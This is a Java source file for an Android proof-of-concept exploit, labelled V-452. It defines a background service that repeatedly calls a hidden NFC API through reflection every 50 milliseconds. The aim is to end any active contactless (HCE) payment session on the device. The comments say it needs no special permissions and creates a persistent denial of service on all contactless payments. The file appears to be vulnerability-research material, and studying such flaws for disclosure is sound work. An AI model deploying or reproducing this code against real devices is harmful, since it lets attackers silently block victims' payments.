package com.poc.nfchijack;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;

/**
 * V-452 PoC: Background service that continuously calls notifyHceDeactivated()
 * to terminate any active NFC HCE payment sessions.
 *
 * ZERO permissions required beyond NFC (auto-granted).
 * This creates a persistent DoS on all contactless payments.
 */
public class NfcKillService extends Service {
    private static final String TAG = "NfcKillService";
    private static final long KILL_INTERVAL_MS = 50; // Every 50ms

    private HandlerThread mThread;
    private Handler mHandler;
    private boolean mRunning = false;
    private int mKillCount = 0;
    private int mFailCount = 0;

    public static final String ACTION_START = "com.poc.nfchijack.START_KILL";
    public static final String ACTION_STOP = "com.poc.nfchijack.STOP_KILL";

    @Override
    public void onCreate() {
        super.onCreate();
        mThread = new HandlerThread("NfcKiller");
        mThread.start();
        mHandler = new Handler(mThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;

        String action = intent.getAction();
        if (ACTION_START.equals(action)) {
            startKilling();
        } else if (ACTION_STOP.equals(action)) {
            stopKilling();
        }
        return START_STICKY;
    }

    private void startKilling() {
        if (mRunning) return;
        mRunning = true;
        mKillCount = 0;
        mFailCount = 0;
        Log.w(TAG, "[V-452] Starting HCE deactivation loop (interval=" + KILL_INTERVAL_MS + "ms)");
        mHandler.post(mKillRunnable);
    }

    private void stopKilling() {
        mRunning = false;
        mHandler.removeCallbacks(mKillRunnable);
        Log.w(TAG, "[V-452] Stopped. Total kills=" + mKillCount + " failures=" + mFailCount);
    }

    private final Runnable mKillRunnable = new Runnable() {
        @Override
        public void run() {
            if (!mRunning) return;

            boolean success = ReflectionHelper.callNotifyHceDeactivated();
            if (success) {
                mKillCount++;
                if (mKillCount % 100 == 0) {
                    Log.i(TAG, "[V-452] HCE deactivation count: " + mKillCount);
                }
            } else {
                mFailCount++;
                if (mFailCount == 1) {
                    Log.e(TAG, "[V-452] First failure — may need different binder path");
                }
            }

            if (mRunning) {
                mHandler.postDelayed(this, KILL_INTERVAL_MS);
            }
        }
    };

    @Override
    public void onDestroy() {
        stopKilling();
        mThread.quitSafely();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
